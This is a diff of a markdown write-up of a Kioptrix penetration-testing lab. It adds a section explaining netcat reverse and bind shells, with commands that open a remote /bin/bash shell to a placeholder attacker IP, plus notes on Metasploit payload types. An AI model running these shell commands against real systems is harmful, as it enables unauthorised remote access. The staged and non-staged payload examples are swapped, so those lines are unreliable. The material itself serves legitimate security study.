@@ -239,7 +239,7 @@ Attackers can exploit the buffer overflows to corrupt a web application's execut
 
 ## Scanning with Nessus
 
-There is a tool to comprehensively scan the vulnerabilities of the target machine, which is called `Nessus`.
+There is a tool to comprehensively scan the vulnerabilities of the target machine, which is called `Nessus`. With this tool, I can do the brute-force attacks with `hydra`, web application scanning and TCP, SYN and UDP scannings.
 
 Here is the steps to use this service.
 
@@ -267,10 +267,56 @@ Here is the steps to use this service.
 
    ![setting5](../assets/img/kioptrix/Screenshot%202024-07-02%20at%2011.12.20.png)
 
-3. From now on, I am going to use this scanned potential vulnerabilities in the process of exploitation.
+3. From now on, I am going to use this scanned potential vulnerabilities in the phase of exploitation.
 
    ![setting6](../assets/img/kioptrix/Screenshot%202024-07-02%20at%2012.12.50.png)
 
    ![setting7](../assets/img/kioptrix/Screenshot%202024-07-02%20at%2012.12.20.png)
 
 ## Exploitation
+
+### What is (netcat) reverse shell?
+
+The target is connecting to the attack box that is listening. That means attacker's machine should be a server and a victim should be a client. An attacker opens up a port for communication and waits for incoming connection from the victim.
+
+`nc -lvnp 7777` (attacker's machine)
+
+TCP connection port 7777
+
+`nc [attacker_ip] 7777 -e /bin/bash` (victim's machine)
+
+### What is (netcat) bind shell?
+
+Attacker's machine should be a client and the victim's machine should be server. So a victim opens up a port and waits for the client(attacker) to connect to the opened port. So attacker can make commands remotely on the victim's machine.
+
+`nc -lvnp 7777 -e /bin/bash` (victim's machine)
+
+TCP connection port 7777
+
+`nc [victim_ip] 7777` (attacker's machine)
+
+### What is a payload?
+
+It is the part of the exploit code that performs the actions desired by the attacker.
+
+### What is staged payloads (particularly in `metasploit` framework)?
+
+A stage payload sends the exploit shellcode in multiple stages. Initially, a small staged payloads is sent to the target machine, which then establishes a connection back to the attacker's machine and downloads the larger staged payloads that contains the actual exploit code. It requires a stable connection in multiple stages. If the connection is interrupted, the exploitation will be incomplete.
+
+Example,
+
+`windows/meterpreter_reverse_tcp`
+
+### What is non-staged payloads (particularly in `metasploit` framework)?
+
+The entire payload is sent to the target machine in one go. This payload contains all the necessary code to exploit the target and establish a session. The payload is executed on the target machine, providing the attacker with the desired shell or access. It is more stable because it does not require to maintain the connection for multiple stages. However, the payload is larger, which can make it more difficult to deliver successfully and potentially easier to detect.
+
+Example,
+
+`windows/meterpreter/reverse_tcp`
+
+I have to choose between using the staged and non-staged payloads depends on several factors, including network connection stability, the target environment, the payload size, and requirements of penetrating test.
+
+1. Samba exploitation
+   
+   
